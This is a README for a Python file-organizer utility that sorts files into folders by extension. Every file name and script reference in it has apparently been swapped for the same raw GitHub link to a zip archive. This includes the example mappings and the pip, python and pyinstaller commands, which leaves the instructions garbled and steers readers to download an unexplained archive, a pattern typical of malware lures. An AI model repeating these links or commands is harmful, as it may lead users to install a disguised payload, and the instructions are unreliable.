
# 🗂️ File Organizer

A simple and efficient Python utility that automatically organizes files in a specified directory into categorized folders (such as Documents, Images, Videos, Music, Archives, and more).

## 📌 Features

- Automatically scans and organizes files based on their extensions.
- Categorizes files into folders:
  - 📄 Documents
  - 🖼️ Images
  - 🎥 Videos
  - 🎵 Music
  - 📦 Archives
  - ⚙ Others (unknown or uncategorized)
- Easy to customize with additional file types or folders.
- Lightweight and beginner-friendly.

## 🚀 How It Works

The script looks into the given folder (e.g., `Downloads`) and moves files into categorized folders. For example:
- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Documents/`
- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Music/`
- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Images/`
- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Videos/`

## 🛠️ Requirements

```
pip install -r https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip
```

> This script uses only standard Python libraries, so `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` may be optional.

## 📁 File Types Handled

| Category    | Extensions                              |
|-------------|------------------------------------------|
| Documents   | .pdf, .docx, .txt, .pptx, .xlsx, .csv     |
| Images      | .jpg, .jpeg, .png, .gif, .bmp, .svg       |
| Videos      | .mp4, .mkv, .avi, .mov                    |
| Music       | .mp3, .wav, .aac, .flac                   |
| Archives    | .zip, .rar, .tar, .gz                     |
| Others      | Any file not matching the above types     |

## 🧑‍💻 Usage

```
python https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip
```

You may be prompted to enter the path of the folder you want to organize. Or, you can modify the script to hardcode a default path.

## 📝 Customization

You can easily add more extensions or categories in the `EXTENSIONS` dictionary in the script:

```python
EXTENSIONS = {
    "Documents": [".pdf", ".docx", ".txt"],
    "Images": [".jpg", ".png", ".gif"],
    ...
}
```

## 📦 Packaging (Optional)

To convert to `.exe`:
```
pyinstaller --onefile --noconsole https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip
```

## 👤 Author

Created by **Shreyash Patel**  
MIT License ©️ 2025
